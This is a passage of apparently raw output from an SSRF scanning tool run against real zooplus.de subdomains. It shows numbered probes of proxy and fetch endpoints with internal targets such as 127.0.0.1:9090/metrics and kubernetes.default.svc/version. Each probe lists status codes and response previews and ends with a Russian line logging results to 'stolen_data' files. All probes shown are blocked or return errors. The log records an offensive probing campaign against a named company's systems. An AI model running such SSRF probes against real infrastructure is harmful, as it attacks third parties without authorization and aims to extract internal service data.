+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_49.txt
+
+[50] Subdomain: t.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_50.txt
+
+[51] Subdomain: t.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_51.txt
+
+[52] Subdomain: t.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_52.txt
+
+[53] Subdomain: m.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_53.txt
+
+[54] Subdomain: m.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_54.txt
+
+[55] Subdomain: t.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_55.txt
+
+[56] Subdomain: t.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_56.txt
+
+[57] Subdomain: t.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_57.txt
+
+[58] Subdomain: t.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_58.txt
+
+[59] Subdomain: t.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_59.txt
+
+[60] Subdomain: t.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_60.txt
+
+[61] Subdomain: t.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_61.txt
+
+[62] Subdomain: t.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_62.txt
+
+[63] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_63.txt
+
+[64] Subdomain: t.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_64.txt
+
+[65] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_65.txt
+
+[66] Subdomain: t.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_66.txt
+
+[67] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_67.txt
+
+[68] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_68.txt
+
+[69] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://kubernetes.default.svc/version
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_69.txt
+
+[70] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_70.txt
+
+[71] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_71.txt
+
+[72] Subdomain: t.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_72.txt
+
+[73] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_73.txt
+
+[74] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_74.txt
+
+[75] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_75.txt
+
+[76] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_76.txt
+
+[77] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_77.txt
+
+[78] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_78.txt
+
+[79] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_79.txt
+
+[80] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_80.txt
+
+[81] Subdomain: t.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_81.txt
+
+[82] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_82.txt
+
+[83] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_83.txt
+
+[84] Subdomain: beta-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_84.txt
+
+[85] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_85.txt
+
+[86] Subdomain: beta-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_86.txt
+
+[87] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_87.txt
+
+[88] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_88.txt
+
+[89] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_89.txt
+
+[90] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_90.txt
+
+[91] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_91.txt
+
+[92] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_92.txt
+
+[93] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_93.txt
+
+[94] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_94.txt
+
+[95] Subdomain: beta-www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_95.txt
+
+[96] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_96.txt
+
+[97] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_97.txt
+
+[98] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_98.txt
+
+[99] Subdomain: beta-www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_99.txt
+
+[100] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_100.txt
+
+[101] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_101.txt
+
+[102] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+    [+] Полные данные сохранены: logs/stolen_data_102.txt
+
+[103] Subdomain: beta-www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 147 bytes
+    Server: CloudFront
+    Preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
